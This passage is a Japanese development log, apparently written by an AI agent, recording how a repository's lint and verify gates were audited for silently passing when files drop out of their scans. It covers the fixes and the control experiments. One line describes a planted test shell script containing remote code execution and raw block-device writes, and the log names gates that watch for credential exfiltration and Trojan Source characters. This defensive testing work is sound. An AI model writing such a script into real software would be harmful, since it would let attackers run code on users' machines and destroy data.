`vault:check` で 150 件・exit 0)・復帰後 **17 / 17**。★★ **自戒 3 つ** —— ① **A / B / C が 1 度目に鳴らなかった**: 照合の**呼び出しを残したまま門 (`if (cross.code !== 0)`) を消す**形で、証人は「呼んでいる」ことしか見ていなかった。**結果を使う形そのもの**を要求して初めて鳴る (**鳴らない対照は合格ではなく、その検査についての報せ**) ② **母集団の定義を私が狭く書き、自分で置いた双方向の検査が直させた** —— 「木を歩く」で数えたら `lint:repo-size` (パス 470 が実際に間引いたゲート) が台帳から落ちた。**道具の届く範囲が母集団の境目**である ③ **忠実でない戻し方は鳴った理由をすり替える** —— `vault:check` の対照で照合の呼び出し (= 3 回目の歩き) を残したら、群ごとの計数器の位相がずれて**別の理由で**鳴った (224 件)。丸ごと戻すと **150 件・exit 0** で、直す前の HEAD の実測と完全に一致した。★ **測って何も無かった軸も記録する**: ① **`lint:parameter-prose` はテンプレート補間を拾わない** (実測: 素の式と JSX は拾う) —— 画面が数字を刷るいちばん自然な書き方なので死角に見えたが、**renderer 278 ファイル × 台帳の定数 115 件で該当 0 件**なので罠であって生きた欠陥ではない ② **`chain:verify` は落とせない** (母集団が名指しの保護対象の一覧) —— 「測っていない」と「床が在る」を `not-thinnable` で区別したが、**この門が一部の死に耐えるかは未測定**である ③ **`lint:test-coverage` / `lint:mutation-scope` は歩きが複数あり、照合は 1 つに当てた** (同じ木を歩くので同時に死ぬ見立てだが測っていない)。`typecheck` 緑・`npm test` **907 / 19,189**・`verify:all` exit 0・`chain:verify` 緑 (保護対象は 1 つも触っていない)。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・****2026-09-26 パス 471 後も 11,971,801 B / 3,384,320 B で byte 単位で不変 (md5 も同一)** (直したのは `scripts/` 9 本と新しい `scripts/lib/` 1 本・`__tests__/` 3 本 (うち 1 本新設)・`ontology/`・`docs/` だけ —— **出荷コードは 1 行も動いていない**。それでも**両方を組んで md5 まで見た** (`fef32c62…` / `5e00fcdf…`)。**走査が 1% 死んでも、木を歩く 6 本のゲートすべてが ✅ exit 0 だった。** **見つけ方**: パス 470 が残した問い (「`readdirSync` を歩く 6 本には 2 つ目の数え方が無い」) を測りに行った。実測 (2026-09-26 · 隔離した写しの上で `readdirSync` を一様に間引く):

| 残した割合 | 鳴ったゲート | 黙ったゲート |
| --- | --- | --- |
| **99% (1% 死)** | 0 / 6 | **6 / 6 が ✅ exit 0** |
| 90% | `lint:network-targets` | 5 / 6 |
| 75% | + `lint:charset` | 4 / 6 |
| 50% | + `lint:imports` / `lint:url-encoding` | **2 / 6** (`lint:regex` / `lint:sample-data`) |

★★ **道具の欠陥が先に出た —— `keep` は逆数しか表せなかった。** パス 470 の実装は `i % round(100 / pct) === 0` で、`pct` が 51〜99 だと `round(100 / pct)` がどれも **1** になり**何も落とさない**。それでも報告は「kept 530/530」と刷るので、`KEEP_PCT = 90` と書けば**「1 割落として鳴らなかった」と読める記録が、1 件も落とさずに出る** —— 鳴らない対照を合格と読む形の、**この前置きの 4 つ目の忠実さの罠**である。真の割合 (`floor(i·pct/100) > floor((i−1)·pct/100)`) へ直し、**群の 1 件目は必ず残す** (1 件の群を位置で消す揺れる測定へ戻さない · パス 470 の自戒)。★ **そして直すと、パス 470 が publish した「4 本が鳴る」の射程が分かった** —— あれは**半分の損失**での話で、1% では 6 / 6 が黙っていた (鳴った 4 本はどれも合計の床が偶然半分をまたいだだけで、`lint:regex` は床 500 に対し残 796・`lint:sample-data` は床 300 に対し残 731 なので**半分死んでも緑**)。★ **塞ぎ方は「割合の床」ではない** (実測に張り付けた床は直した日に落ちる門になる · パス 378) —— **権威に独立して数えてもらう**。木を歩く走査では git は母集団ではなく**証人**として使えるので、`scripts/lib/tracked-cross-check.cjs` が「**追跡されていてそのゲートの条件に合うファイルは、どれも走査されている**」を見る。1 件でも落ちれば鳴るので**割合に依らない**。★ **向きは片側だけ** —— 逆 (走査した物はどれも追跡されている) は**偽**で、実測すると `orchestration/dependency-audit.json` は木に在って追跡されておらず、`lint:regex` / `lint:sample-data` は自分自身を走査から外しつつ読む。**等号を要求すると生成物を 1 つ置いた日から鳴り続ける門になる** (対照 E: 等号にすると 3 ゲートが今日落ちる)。★ **条件は 1 つの綴りで、数え方が 2 つ** —— 条件 (`roots` / `skipDirs` / `accept`) を照合の側にも並べると 2 つ目の台帳が静かに古びるので、歩く側と照合が**同じ定数**を読む (写すのは条件だけで、歩き方は写さない)。★ **証人そのものが narrow されたら照合は静かに空になる** (失敗が開く向き) ので、広い一覧と pathspec つき (`-- .`) を突き合わせる —— 実測 (対照 I / J): 突き合わせが在れば 2 ゲートとも「一覧が信用できません」と鳴り、**外すと 2 ゲートとも黙った**。★ **git が使えないときは落とさずに飛ばす** (この 6 本の仕事は git を要らない) が、**成功行が「照合したか」を名乗る** (パス 470 で `lint:shell` の成功行が使っていない出どころを名乗っていた欠陥を直した当のこと)。`lint:repo-size` が git 無しで exit 1 なのは**母集団そのものが git** だからで、ここと矛盾しない。★ **写しを 2 → 1 に減らした** —— `gitLsFiles` はパス 470 が 2 ゲートに 1 つずつ置いており、3 人目の消費者が現れたので中心へ出した (法則 `center-then-count-callers`)。**契約は 2 通り実在する**ので投げる版と `null` を返す版の両方を出す (`lint:repo-size` は fail closed・`lint:shell` はフォールバックを持つ)。**直した後の実測: 8 / 8 が鳴る** (1% の損失で)。★★ **鳴らなかった対照が 1 つ在り、それは報せだった** —— `acceptPath` (`lint:imports` は既知のゾーンの外を走査しない) を外しても実物のゲートは緑。実測すると**ゾーンの外に居る追跡ファイルは 0 件** (528 / 528) なので今日この条件は拘束していない。判定そのものに標本を当てて留めた (`src/` の直下に新しい木を 1 つ作った日、この条件が無ければ照合は永久に鳴り続ける = 偽陽性の向き)。★ **対照 10 方向のうち 9 が鳴り、それぞれ狙った層に当たる** (A 照合の呼び出しを 1 本外す ❌2 / **B (= HEAD の姿) 道具が `keep 99%` で 6 / 6 を `silent exit=0` と報告** / **C 実物で `acceptPath` を外す → 鳴らない (報せ)** / C2 判定の層で外す ❌1 / D 自己除外を無視 → 実物 2 ゲートが ❌ / E 等号を要求 → 実物 3 ゲートが ❌ / F `keep` を逆数へ戻す self-test ✗1 / G `ENFORCEMENT` から 1 本外す ❌2 / H `CROSS_CHECK` の export を落とす ❌3 / I git の広い一覧だけ間引く → 2 ゲートとも鳴る / J 2 度訊く検査を外す → 2 ゲートとも黙る)・復帰後 **30 / 30**。★ **ゲートが 3 つ捕まえた —— どれも設計どおり**: ① `lint:forbidden` の双方向 (新しいモジュールが子プロセスを読むので「台帳に無い例外」/ `lint-repo-size.cjs` は写しが消えたので「台帳にあるのに効いていない」) ② **整合性チェーンの閉包検査** —— 保護対象 `lint-sample-data.cjs` が新しいモジュールを読むので**判定が保護の外へ出ていた** (パス 402 / 410 と同じ形。保護対象 92 → **93**・block **#261 / #262**) ③ `commentStripperCensus` の「寄せた本の一覧」86 → **87**・`verify:arch` のユニットテスト数 15977 → **15989** (**今回も予想せず門に訊いた**)。★ **測って何も無かった軸も記録する**: ① **`lint:network-targets` の `src` の外の母集団は2026-09-20 から既に git の一覧**なので、この照合が足すのは `src` の木の側だけ ② **群ごとの床は外していない** —— 照合は「一部が死んだ」を、床は「群が丸ごと消えた」を見るので、失敗の文面が別物になる (どちらが壊れたか読めるほうが良い) ③ **`lint:shell` / `lint:repo-size` に群ごとの床は今日も足していない** (弱くなっていない所に床を足さない · パス 469 の判断)。`typecheck` 緑・`npm test` **907 / 19,184**・`verify:all` exit 0・`chain:verify` 緑 (block #262)。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・****2026-09-25 パス 470 後も 11,971,801 B / 3,384,320 B で byte 単位で不変 (md5 も同一)** (直したのは `scripts/` 5 本と `__tests__/` 2 本・`ontology/`・`docs/` だけ —— **出荷コードは 1 行も動いていない**。それでも**両方を組んで md5 まで見た** (`fef32c62…` / `5e00fcdf…`)。**母集団を `git ls-files` から取る 2 本は「一部だけ死んだ走査」を 1 度も測られておらず、`lint:shell` はフォールバックが `scripts/` 直下から詰め直して成功行そのものが偽だった。** **見つけ方**: パス 469 が残した問い —— 「`git ls-files` を読む 2 本はこの前置きで測れない」—— をそのまま閉じた。前置き (`scripts/lib/partial-scan-preamble.cjs`) に子プロセスの同期実行の包みを足し、**広い一覧だけ**を間引く (pathspec つきは通す) 形で測る。実測 (2026-09-25 · 隔離した写しの上で):

| ゲート | 落とした物 | 直す前 |
| --- | ---: | --- |
| **`lint:repo-size`** | 根 `knowledge-vault` **7,402 件** | **✅ exit 0「追跡 1683 ファイル / 合計 47.1 MB」** |
| 同 | 根 `src` 1,466 / `scripts` 104 / `docs` 61 | **✅ exit 0** |
| 同 | 群ごとに半分 **4,524 件** | **✅ exit 0** |
| **`lint:shell`** | 一覧から `.sh` を全部 | **✅ exit 0「Checked 9 (追跡ファイル全体から収集)」** |
| 同 | 一覧から `tools/` (**1 件**) | **✅ exit 0「Checked 9」** |
| 同 | 群ごとに半分 (`.sh` 9 → 5) | **✅ exit 0** |

★ **いちばん重いのは `lint:shell` の 4 行目で、成功行そのものが偽だった** —— 一覧は `readdirSync('scripts')` から来ており「追跡ファイル全体」ではない。しかも**件数 (9) が素の木と同じ**なので、読んだ人には見分けが付かない。引き金が「一覧に `.sh` が 0 件」だったため、**「git が居ない」と「一覧が narrow された」を見分けられなかった** —— **2026-08-22 に走査を広げた当の理由 (`tools/deploy.sh` が誰にも見られないままになる) が、フォールバックの引き金を通って戻っていた**。植えた標本で確かめた: `tools/deploy.sh` (strict mode 無し + 遠隔コードの実行 + ブロックデバイスへの書き込み) は素の木で **❌ 3 件**、一覧を narrow すると **✅**。★ **`lint:repo-size` は向きが「安心させる」側** —— 落ちた分は合計から引かれるので*より予算内に見える*。`knowledge-vault/` に **12.40 MB** の生成物を追跡させた木で実測: 素の木は ❌ 2 件 (1 ファイル 12.40 MB > 12 MB・合計 88.6 MB > 80 MB)、根を落とすと **✅ 予算内**で**95% の警告まで消える**。合計の床 `MIN_TRACKED_FILES` (1000) は実測 9,084 の **11%** に在るので、80% を落としても届かない。**直し**: ① **フォールバックは `catch` (git が使えない) のときだけ** ② 成功行は**実際に使った出どころ**を名乗る (`summaryLine` —— 外側の証人が門を丸ごと走らせずに留められるよう関数に出した) ③ **権威 (git) に別の綴りで 2 度訊いて一致を要求する** (`crossCheckProblem`) —— `git ls-files -z` を自分で濾した答えと `git ls-files -z -- *.sh` / `-- .` が同じ集合でなければ落ちる。**床ではない**: 「1 本だけ落ちた」形はどんな床にも映らないし、この形は**割合を問わず**鳴るので実測に張り付けた比率を決める必要が無い (パス 378 の「実測に張り付けた床は直した日に落ちる門になる」)。★ **`REQUIRED_GROUPS` は「振る舞いの宣言」であって機構の宣言ではない** —— パス 469 の外側の証人は「宣言するゲートは共有の判定を呼ぶ」を全ゲートに要求していたが、この 2 本では**群ごとの床が何も足さない** (`lint:shell` の母集団は「1 つの拡張子 × 1 つの根」なので合計の床がそのまま捕まえる)。**弱くなっていない所に床を足さない** (パス 469 の判断) ので、機構を `ENFORCEMENT` 台帳が `shared-floor` / `cross-check` として名乗り、証人は**名乗った機構の実在**を見る。★★ **「任意の割合で死んだ走査」も測った —— 鳴るかどうかは「そのゲートの設計」ではなく「床の位置 ÷ 実測」で決まっていた。** 群ごとに半分へ間引くと `readdirSync` を歩く 6 本のうち **4 本が鳴る**が、理由はどれも合計の床が半分をまたいだからである (`lint:url-encoding` / `lint:imports` は床 300 に対し 528 → 264・`lint:charset` は 1000 に対し 1,663 → 844 (+ ALLOWLIST の双方向 12 件)・`lint:network-targets` は `src` の外の床 60 に対し 111 → 55)。**床を 1 つ下げれば黙る**ので守りではなく偶然で、残る 2 本 (`lint:regex` 786 件 / `lint:sample-data` 724 件) は黙る。**だから割合の床は足さない** —— 測った答えを `THINNING` 台帳が双方向で持ち、保留の決まり文句は書けない。★ **道具の忠実さで 3 つ躓いた** —— ① `keep` を通し番号 (`i % 100 < N`) で書いたら、1 件しか無い群が位置で丸ごと消えて群ごとの床が*偶然*鳴り、**ファイルを 1 つ足せば答えが変わる揺れる測定**になった (実測でその形は 6 本のうち 5 本が `rings`。群ごとの歩幅へ直した) ② **両方の数え方を同時に殺すと鳴った理由がすり替わる** —— `lint:shell` のフォールバックも死ぬので「一覧が narrow された」ではなく「木ごと消えた」で鳴る (`AUDIT_PARTIAL_TARGET=git` を足した) ③ **pathspec つきの呼び出しまで間引くと「2 度訊く」検査が永久に観測できなくなる** (鳴らない対照を合格と読む形そのもの)。★★ **そして対照 A が 1 度目に鳴らなかった** —— フォールバックの引き金を直す前へ戻しても **15 件すべて緑**だった。`.sh` が 9 本ある木では「PATH を空にする」検査にその違いが出ないからで、**git の一覧だけを間引く**形へ当て直して初めて ❌ 1 になる。**鳴らない対照は合格ではなく、その検査についての報せである。**★ **対照 10 方向すべて鳴り、それぞれ狙った層に当たる** (A フォールバックの引き金を戻す ❌1 (**決定的な検査**) / B 成功行を 1 本へ戻す ❌1 / C `lint:shell` の照合を常に null ❌3 / D `lint:repo-size` の照合を常に null ❌2 / E `lint:repo-size` の呼び出しを外す ❌1 / F `THINNING` の理由を「同上」へ ❌1 + self-test ✗1 / G `ENFORCEMENT` から 1 本消す ❌2 + self-test ✗1 / H 前置きの git 包みを外す self-test ✗1 + ❌2 / I `keep` を通し番号へ ✗1 / J pathspec つきも間引く ✗1)。★ **測って何も無かった軸も記録する**: ① **`lint:repo-size` は git が使えないと今も例外で落ちる** (exit 1 · パス 470 より前からの振る舞いで、fail closed なので直していない) ② **前置きに潜んでいた落ち方を 1 つ塞いだ** —— 名前が読めない項目 (Buffer で返る形) で `path.join` が投げ、`fs.rmSync` の内部が読む一覧でそれが起きた。**触らずそのまま通す**形に直した (投げると呼び手が壊れ、その落ち方を「床が鳴った」と読み違える) ③ **`lint:shell` の群ごとの床は今日は要らない** (母集団が 1 拡張子 × 1 根なので合計の床と同じ所しか捕まえない)。★ **ゲートが 3 つ捕まえた** —— ① `lint:forbidden` が**私の法則の散文**を鳴らした (禁止の綴りをそのまま書いた · パス 466 / 469 と同じ家系) ② 同じ門が台帳の件数のずれを 2 件 (理由つきで登録) ③ `verify:arch` のユニットテスト数を 15957 → **15977** へ (**今回も予想せず門に訊いた**)。`typecheck` 緑・`npm test` **906 / 19,172**・`verify:all` exit 0・`chain:verify` 緑 (保護対象は 1 つも触っていない)。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・****2026-09-25 パス 469 後も 11,971,801 B / 3,384,320 B で byte 単位で不変 (md5 も同一)** (直したのは `scripts/` のゲート 6 本と道具 1 本・新しい `scripts/lib/` 2 本・`__tests__/` 1 本・`ontology/`・`package.json`・`docs/` だけ —— **出荷コードは 1 行も動いていない**。それでも**両方を組んで md5 まで見た** (`fef32c62…` / `5e00fcdf…`)。**床は「0 件」にしか当たらない —— 画面 (`.tsx` 108 件) が走査から消えても 5 本のゲートが ✅ exit 0 だった。** **見つけ方**: パス 468 が残した問い —— 「`audit:gate-floors` は母集団を**空**にしてしか試していない」 —— をそのまま測りに行った。隔離した写し (`git worktree`) の上でゲートの入口に前置きを差し込み、`readdirSync` から**ファイルの項目だけ**を落として (ディレクトリは落とさない —— 落とすと部分木ごと消えて、どれだけ死んだのかが読めない) 終了コードを読む。実測 (2026-09-25 · 13 ゲート):

| 落とした群 | 直す前 |
| --- | --- |
| **`.tsx` 108 件 (= 画面そのもの)** | **`lint:network-targets` / `lint:url-encoding` / `lint:regex` / `lint:imports` / `lint:charset` が ✅ exit 0** |
| 根 `scripts/` 102 件 | **`lint:regex` / `lint:charset` / `lint:sample-data` が ✅** |
| 根 `docs/` 61 件 | **`lint:charset` が ✅** |
| 根 `orchestration/` | **`lint:regex` / `lint:sample-data` が ✅** |

★ **合計の床が捕まえたのは 13 のうち 2 本だけ** (`lint:parameter-prose` 170 < 200 / `lint:zero-fold` 228 < 240) で、しかも**どちらも床がたまたま実測のすぐ下に在った**ためである。残りで鳴った 4 本 (`lint:forbidden` / `lint:sample-data` / `lint:storage` / `lint:shared-judgement`) は**台帳の双方向・生成物の一致という別の機構が偶然**捕まえた物で、床ではない (実測: 失敗の文面がどれも「台帳にあるのに実在しない」「census が古い」だった)。★ **向きが重い** —— `.tsx` はこのアプリの画面そのもので、消えた 5 本は **URL の符号化** (`lint:url-encoding`)・**送り先が変数の通信** (`lint:network-targets` = 資格情報の流出経路)・**プロセス境界** (`lint:imports`)・**ReDoS** (`lint:regex`)・**Trojan Source ほか不可視文字** (`lint:charset`) である。**パス 464 が「`.tsx` は JS ではない」で 1 度捕まった当の層**が、今度は「走査から丸ごと消えても誰も鳴らない」形で残っていた。★★ **`lint:charset` は「宣言」を検めていた** —— 2026-09-14 (パス 255) から `SCAN_EXTS` が `.sh .yml .html .css .js .svg` を**含むこと**を自己テストで要求しているが、それは**宣言に綴りが在ること**であって**1 件でも読んだこと**ではない。走査の側が拡張子を落とし、宣言はそのままという形は素通りする (法則 `mention-vs-declaration` の、**ゲート自身の中での現れ**)。**直し**: ① 判定は共有の 1 つ `scripts/lib/population-floor.cjs` (`groupFloorProblems` / `reportGroupFloor`) で、**「宣言した群はどれも 1 件以上」**を要求する ② **割合にはしない** —— 実測に張り付けた床は直した日に落ちる門になる (パス 378 で実際にそうなった)。群ごとに 1 件あれば通るので、母集団が増えても減っても床は動かない ③ **正当に 0 になる群は宣言しない** (パス 467) —— `lint:charset` の `.yaml` / `.mjs` は今日 0 件の**受け皿**なので `OPTIONAL_EXTS` として床の下に置き、**既定は「要求する」側**にした (17 個目の拡張子を `SCAN_EXTS` へ足した人は自動的に床の中に入る) ④ `lint:charset` の要求は**宣言からそのまま導く** (`SCAN_EXTS` − `OPTIONAL_EXTS` / `SCAN_DIRS`) ので、**宣言を縮めれば上の自己テストが、結果が縮めばこちらが鳴る** ⑤ `lint:regex` / `lint:sample-data` の `.js` / `.mjs` は今日 0 件なので宣言しない。★ **道具は常設にした** (`npm run audit:gate-partial` —— **同じ道具の 2 つ目のモード**で、数は 8 本のまま。CI では走らせない)。**落とす群はゲート本体の `REQUIRED_GROUPS` から読む** —— 道具の側にも群を並べると 2 つ目の台帳が静かに古びるので、`lint:charset` に `require.main` の番と `module.exports` を足して外から読めるようにした (`check-import-boundaries.cjs` が同じ理由で同じ番を持つ)。実測: **6 ゲート × 42 組すべてが鳴る**。台帳の形は `src/shared/__tests__/populationGroupFloor.test.ts` (**15 件**) が毎回の `npm test` で見る (共有の判定の振る舞い・**宣言しているゲートと `PARTIAL_GATES` の双方向**・宣言したゲートが**実際に共有の判定を呼ぶ** (注記の中の言及では満たされない・標本つき)・床が実測に張り付いていないこと)。★ **対照 9 方向すべて鳴り、それぞれ狙った層に当たる** (A `lint:url-encoding` の群の床を外す → 道具が **`ext .tsx` を 108 件落としても exit 0** と名指し (`.ts` と `root:src` は合計の床が捕まえる —— **直した後の絵が、合計の床と群の床の分担をそのまま示す**) / B `lint:charset` の群の床を外す → **12 組が silent** / **C 受け皿 (`OPTIONAL_EXTS`) を空にする → 実物のゲートが今日落ちる** (過剰の向き・`.yaml` / `.mjs` を名指し) / D 共有の判定が「宣言が空」を受け入れる ❌1 / E `PARTIAL_GATES` から 1 本消す ❌1 / F ゲートが `REQUIRED_GROUPS` を export しなくなる ❌3 / G 共有の判定が根を見ない ❌1 / **H 前置きがディレクトリも落とす → self-test ✗1** / I `lint:sample-data` の群の床を外す ❌3)。★★ **自戒: 対照 H は 1 度目に鳴らず、原因は私の錠だった** —— 「ディレクトリは落とさない」を `ext` モード (`.md` を落とす) で確かめていたが、**ディレクトリは拡張子を持たないので針が当たらない** (`'' !== '.md'` で残る)。門を外しても通るので、その検査は**違う理由で**合格していた。`keep 0` (何も残さない) へ替えると H は ✗1 で鳴る。**鳴らない対照は合格ではなく、その検査についての報せである** (パス 468 の対照 J と同じ形で、2 パス連続)。★ **測って何も無かった軸も記録する**: ① **`lint:test-coverage` は `.tsx` が消えても弱くならない** —— 数える母集団はサービス (`SERVICE_IDS`) と**検査ファイル** (`.test.ts`) で、画面の `.tsx` は 1 件も入っていない (実測: 432 件落としても答えは同じ)。**弱くなっていないゲートに床を足さない** ② **`lint:workflow-security` の母集団に `.tsx` は 0 件** (`.github/workflows/*.yml` だけ) ③ **`git ls-files` を読む 2 本 (`lint:shell` / `lint:repo-size`) は `readdirSync` を通らない**のでこの前置きでは測れない —— 同じ形で測るなら子プロセスの出力を包む別の手が要る (測っていないことを残す)。`typecheck` 緑・`npm test` **905 / 19,152**・`verify:all` exit 0・`chain:verify` 緑 (`lint-sample-data.cjs` が保護対象なので block **#260** を採掘)。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・****2026-09-25 パス 468 後も 11,971,801 B / 3,384,320 B で byte 単位で不変 (md5 も同一)** (直したのは `scripts/` 6 本と `__tests__/` 1 本・`ontology/`・`package.json`・`docs/` だけ —— **出荷コードは 1 行も動いていない**。それでも**両方を組んで md5 まで見た** (`fef32c62…` / `5e00fcdf…`)。**母集団を空にすると、37 ゲートのうち 5 本が ✅ exit 0 で通った。** **見つけ方**: パス 467 が残した問い (「走査した件数を刷るゲートのうち、母集団が空になったら落ちるのは何本か」) を測りに行った。**綴りでは測れない** —— 床の効き方は実測で **7 通り**あり (`MIN_*` の定数・台帳の双方向・名指しの走査・生成物の byte 一致・正典の値が計算不能・保護対象の不一致・**副作用としての床**)、どの綴りを数えても取りこぼす。だから `audit:comment-blind --gates` と同じ形 —— **隔離した写しの上で母集団を空にして終了コードを読む** —— にした (`npm run audit:gate-floors`・**定期点検の道具 8 本目**)。実測 (2026-09-25):

| 測った物 | 実測 |
| --- | --- |
| 空にする母集団を持つゲート | **33 / 37** (残る 4 本は理由つきの免除) |
| 直す前に母集団を空にしても exit 0 | **5 本** |
| 直した後 | **0 本** (33 / 33 が鳴る) |

★ **いちばん重いのは `verify:knowledge`** —— コーパスの **85% (academic 3,417 件)** が母集団から丸ごと消えても「確証ゲート検証: 622 項目」と刷って **✅ exit 0** だった。**出典を確かめるのが仕事のゲートが、確かめる物が消えたことに黙っていた** —— しかも隣の `lint:knowledge-refs` は同じ状態で `MIN_CORPUS_IDS` (1000) に当たって鳴る (パス 467 で私が足した床)。つまり**同じコーパスについて、床は 1 つのゲートに在って、もう 1 つには無かった**。★ 残る 4 本: `lint:url-encoding` (「Scanned 0 file(s): 通信 URL の補間 0 件」)・**`lint:sample-data`** (「ソース・スクリプト **0** ファイルを検査」——見本の側 279 件は生きているので**合計の床では片側の死が見えない**。この門は「見本データに実在の個人データは混ざっていません」と答える)・`lint:collection-time` (「Scanned 0 mutate-listed file(s)」—— 同じ `mutate` を見る隣の `lint:mutation-scope` は台帳の双方向で鳴るので、**同じ母集団について片方だけが黙っていた**)・`lint:test-coverage` (「Checked **0** services」——「**すべての**サービスに検査がある」は空の母集団に対して自明に真)。★★ **2026-09-05 の注記が母集団を 2 本と書いていた** —— `lint:imports` の中の「走査数を表示するだけで床の無いゲートを**ここと lint:regex** に見つけた」。あの日の掃除は 2 本を直したが、**何本在るかは数えていなかった** (法則 `measure-before-claim`)。**直し**: 5 本に床を置く (**新しい規則は 1 つも作らない** —— 既存の床の言い方をそのまま使う)。`lint:sample-data` は**2 つの母集団を別々に**見て、`lint:test-coverage` は**3 つ**を見る (どれも walk が死ねば 0 になる)。`verify:knowledge` は合計の床 (1000・`lint:knowledge-refs` と同じ値・同じコーパスを同じ理由で見るので数を揃える) に加えて **宣言したコレクションはどれも 1 件以上** を要求する —— 合計だけだと academic が消えても残り 622 件が床を越える (実測がまさにそれ)。`unknownCollections` (データに在るのに分類が無い) の**逆向き**である。★ **道具は常設にした** —— `git worktree` で HEAD の写しを作り、母集団を空にして、**必ず片付ける** (`finally`)。**CI では走らせない** (ソースを書き換えるし、1 件あたりゲート 1 回ぶんの時間が掛かる)。★ **空にする手は忠実でなければならない** —— 最初の測定は `lint:data-origin` / `lint:credential-use` を「床が無い」と**誤って報告しかけた**: 宣言オブジェクトの**名前だけ**を替えたので、原文を正規表現で読む走査には 76 件がそのまま見えていた (忠実に本体を落とすと 76 件鳴る)。だから各手は `needle` を持ち、**当たらなければ落とす** —— 「空にできなかった」を「床が在る」と読まない (**この道具自身の `count-has-floor`**)。★★ **その self-test も 1 度は弱かった** —— 「投げたか」だけを見ていたので、針の確認を外しても **2 つ目の門 (「1 文字も変わらない」) が投げて違う理由で通った** (対照 J で実測: self-test ✓ のまま検査だけが鳴った)。文面で見分ける形へ直すと J は **self-test ✗1 + 検査 ❌1** で両層に当たる。★ **対照 10 方向すべて鳴り、それぞれ狙った層に当たる** (A〜E 5 本の床を 1 つずつ直す前へ戻す → **道具が `silent exit=0` と報告し、鳴るはずの機構を名指しする** / F 台帳から 1 行消す ❌1 / G 針を実物からずらす ❌1 / H 同じゲートを両方の台帳へ ❌2 / I 道具を `verify:all` へ混ぜる ❌2 / J 針の確認を外す ✗1 + ❌1・復帰後 **9 / 9**)。★ **測って何も無かった軸も記録する**: ① **`MIN_*` を 1 つも持たないのに鳴るゲートは 13 本** (実測。**最初は 7 本と書きかけて、数えたら 13 だった** · 法則 `measure-before-claim`) —— 台帳の双方向 (`lint:mcp-servers`)・名指しの走査 (`lint:forbidden`)・生成物の byte 一致 (`verify:graph` / `vault:check`)・保護対象の不一致 (`chain:verify`)・図の参照の下限 (`verify:arch`)・**副作用としての床** (`lint:data-origin` / `lint:credential-use` は宣言 0 件なら 76 サービスすべてが鳴る)・0 件の明示の枝 (`lint:ipc-handlers`)・`OUTSIDE_POPULATION_FLOOR` (`lint:network-targets`)・`checkPopulations` (`verify:orchestration`)。**「`MIN_*` が無い」は「床が無い」ではない** —— ★ **そして 13 本のうち 2 本は私がこのパスで足した床である** (`lint:sample-data` / `lint:test-coverage` は母集団が 2 つ / 3 つなので `FLOORS` の表にした)。同じパスの中で綴りが 2 通りに分かれたので、**綴りでは測れないことがその場で実証された** ② **空にする母集団を持たないゲートは 4 本** (`typecheck` / `lint` は外部ツール・`lint:csp` / `verify:release-artifacts` は `verify:all` では `--self-test` だけ) —— **「測っていない」ではなく「測る物が無い」**で、どちらも exit 0 に見えるので理由を書かせて見分ける ③ **`lint:doi-prefix` は床を 3 つ持つ** (パス 467 の訂正どおり) が `--self-test` は今も無い —— 空にすると `MIN_ISBN_CHECKED` で鳴るので陰性対照は在る。`typecheck` 緑・`npm test` **904 / 19,137**・`verify:all` exit 0・`chain:verify` 緑 (保護対象は 1 つも触っていない)。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・**2026-09-25 パス 467 後も 11,971,801 B / 3,384,320 B で byte 単位で不変 (md5 も同一)** (直したのは `scripts/` 3 本と `__tests__/` 4 本・`ontology/`・`package.json`・`docs/` だけ —— **出荷コードは 1 行も動いていない**。それでも**両方を組んで md5 まで見た** (`fef32c62…` / `5e00fcdf…`)。**「読めない台帳」を「空の台帳」として ✅ exit 0 で通し、37 ゲート全部が素通りした。** **見つけ方**: パス 466 が残した入口 —— 37 ゲートのうち陰性対照 (`--self-test`) を持たないのは 5 本で、外部ツール 2 本と `chain:verify` を除く **`lint:knowledge-refs` / `verify:orchestration` は self-test も外側の証人も 0 件** —— をそのまま測りに行った。実測 (2026-09-25 · `orchestration/knowledge-distinct-pairs.json` にマージ衝突の印を 1 行入れる):

| 測った物 | 実測 |
| --- | --- |
| `npm run lint:knowledge-refs` | **`Checked 0 adjudicated pair(s) …` + ✅ + exit 0** |
| **`npm run verify:all` (37 ゲート)** | **exit 0** |
| `src/` にこの台帳を読む検査 | **0 件** (`npm test` にも映らない) |

★ **消費者も同じ形だった** —— `knowledge-autopilot.cjs` の `loadDistinctPairs` は `catch { return new Set(); }` で、読めない台帳は「裁定 0 件」として静かに続行する。その Set は **5 つの重複検出器**が除外に使うので、**「別概念として残す」と裁定した 127 組がまるごと重複疑いキューへ戻り、LLM にもう一度統合を勧められる**。実測 (空の Set を実物の検出器へ渡す): `sourceDedupeSuspects` 0 → **16 件**・`sharedSourceDedupeSuspects` 0 → **12 件**。統合は**別概念を畳む**ので、戻る側は情報を失う向きである。★ **床とは別の軸である (正直に書く)** —— この門は最初から `MIN_CORPUS_IDS` という床を持ち、その docblock は「台帳側の件数は課題が片付けば 0 になりうるので床を置かない」と**正しく**述べている (実測に張り付けた床は直した日に落ちる門になる · パス 378)。**欠けていたのは「読めたかどうか」**で、件数とは別に問える。**直し**: ① `readLedger` が `{ok:true,value}` / `{ok:false,reason}` を返し (`missing` / `unreadable` / `unparseable` を分ける) ② 判定を純関数 `evaluate` に出して **読めない・鍵が配列でない**を鳴らす ③ 断りは**下流で何が起きるか**を名指しする ④ 消費者も投げる (**同じ状態に同じ答え** —— 片方だけ直すと「門は鳴るのに走ると静かに壊れる」) ⑤ `--self-test` (**19 件**) と外側の証人 `knowledgeLedgerReadable.test.ts` (**12 件**)。★★ **そして同じ家系が `verify:orchestration` に 4 件在った** —— このゲートは 2026-08-22 に `org` と `policy.cycles` を「鍵を必須にする」で 2 度閉じており、docblock に対照実験まで書いてある。残っていたのは**配列を空にする**側で、実測:

| 壊し方 | exit | 何が起きたか |
| --- | ---: | --- |
| `rounds: []` | **0** | 「rounds: 0 / 直近 round 0 は 0 チーム」と刷って ✅ (不変条件 2〜5 が空虚) |
| `policy.minTeamsForRound: []` | **0** | 最低チーム数 (不変条件 3) が消えて ✅ |
| `org.secretaries` を消す | **0** | **「秘書室 0室(計0体)」と刷って ✅** |
| `backlog: []` | **0** | **床を置かない** (正当に 0 になりうる) |

